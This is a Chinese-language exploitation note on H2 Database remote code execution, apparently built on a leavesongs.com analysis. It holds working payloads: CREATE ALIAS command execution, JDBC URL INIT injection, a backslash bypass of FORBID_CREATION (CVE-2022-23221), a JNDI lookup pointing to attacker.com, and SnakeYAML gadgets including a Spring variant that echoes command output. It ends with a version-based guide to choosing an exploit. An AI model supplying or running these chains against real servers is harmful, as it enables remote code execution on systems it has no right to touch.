# H2 Database RCE 利用链补充 (from leavesongs.com)

> 本文档补充自 Phith0n 对 H2 Database Web Console RCE 的历史分析 [1]

## 漏洞历史时间线

| 时间 | 版本 | 事件 | CVE |
|------|------|------|-----|
| 2018 | <1.4.198 | CREATE ALIAS 执行 Java 代码（设计特性） | CVE-2018-10054 |
| 2019-02 | 1.4.198 | 默认启用 `ifExists=true`，禁止创建新数据库 | - |
| 2021 | - | JDBC Attack 利用 H2 命令执行 | - |
| 2022-01 | <2.0.206 | JNDI 注入绕过（driver class 设置） | CVE-2021-42392 |
| 2022 | 2.0.206 | JNDI 注入修复 | - |
| 2022 | <2.1.210 | 反斜线绕过 FORBID_CREATION | CVE-2022-23221 |
| 2022 | 2.1.210 | 最终修复 | - |

## CREATE ALIAS 命令执行

H2 的 `CREATE ALIAS` 允许将 Java 方法映射为 SQL 函数，这是设计特性而非漏洞：

```sql
CREATE ALIAS EXEC AS $$
    void exec() throws java.io.IOException {
        java.lang.Runtime.getRuntime().exec("calc.exe");
    }
$$;
CALL EXEC();
```

### Web Console 利用

H2 Web Console 默认无认证，攻击者可登录后执行上述 SQL：

```
http://target:8082/login.jsp
```

## JDBC Attack 利用链

### 1. 基础 JDBC URL 注入

```
jdbc:h2:mem:test;MODE=MSSQLServer;INIT=\
    CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$
        //javascript
        java.lang.Runtime.getRuntime().exec("calc.exe")
    $$;
```

**注意**: 使用反斜线 `\;` 转义分号，避免 INIT 语句提前结束

### 2. 绕过 FORBID_CREATION (CVE-2022-23221)

1.4.198 版本后，H2 默认禁止创建新数据库。通过反斜线转义追加的 `FORBID_CREATION=TRUE`：

```
jdbc:h2:mem:test;MODE=MSSQLServer;IGNORE_UNKNOWN_SETTINGS=TRUE;\
FORBID_CREATION=FALSE;INIT=\
    CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException {\
        Runtime.getRuntime().exec("calc.exe");\
    }$$;\
    CALL EXEC ();\
XXX=\
```

**原理分析**:
```
原始 URL + 服务端追加 ;FORBID_CREATION=TRUE
     ↓
jdbc:h2:mem:test;...XXX=\;FORBID_CREATION=TRUE
     ↓
分号被转义，FORBID_CREATION 不再是独立选项
```

### 3. JNDI 注入路径 (CVE-2021-42392)

H2 Web Console 支持通过 JNDI 查找数据源：

```
Driver Class: javax.naming.InitialContext
JDBC URL: ldap://attacker.com:1389/Exploit
```

内部调用链：
```java
// JdbcUtils.getConnection()
if (driver instanceof javax.naming.Context) {
    return ((javax.naming.Context) driver).lookup(url);
}
```

## SnakeYAML + H2 组合利用

在 SnakeYAML 反序列化场景中，直接构造 JdbcConnection 对象：

```yaml
!!org.h2.jdbc.JdbcConnection
- jdbc:h2:mem:test
- MODE: MSSQLServer
  INIT: |
    DROP ALIAS IF EXISTS EXEC;
    CREATE ALIAS EXEC AS $$
        void exec() throws Exception {
            Runtime.getRuntime().exec("calc.exe");
        }
    $$;
    CALL EXEC ();
- a  # username
- b  # password
- false  # forbidCreation
```

### Spring 回显增强版本

利用 Spring 获取当前 Response 对象写入命令输出：

```yaml
!!org.h2.jdbc.JdbcConnection
- jdbc:h2:mem:test
- MODE: MSSQLServer
  INIT: |
    CREATE ALIAS EXEC AS $$
        void exec() throws Exception {
            org.springframework.util.StreamUtils.copy(
                Runtime.getRuntime().exec("id").getInputStream(),
                ((org.springframework.web.context.request.ServletRequestAttributes)
                    org.springframework.web.context.request.RequestContextHolder
                    .currentRequestAttributes())
                    .getResponse().getOutputStream()
            );
        }
    $$;
    CALL EXEC ();
- a
- b
- false
```

## 版本检测与利用选择

```
版本 < 1.4.198:
    → 直接使用 CREATE ALIAS 或 INIT 注入

1.4.198 ≤ 版本 < 2.0.206:
    → 反斜线绕过 FORBID_CREATION
    → 或利用 JNDI 注入 (JDK < 8u191)

2.0.206 ≤ 版本 < 2.1.210:
    → 反斜线绕过 FORBID_CREATION (CVE-2022-23221)

版本 ≥ 2.1.210:
    → 已彻底修复，无法利用
```

## 参考

[1] Phith0n. "扒一扒h2database远程代码执行". leavesongs.com. 2025-04-19.
    https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html
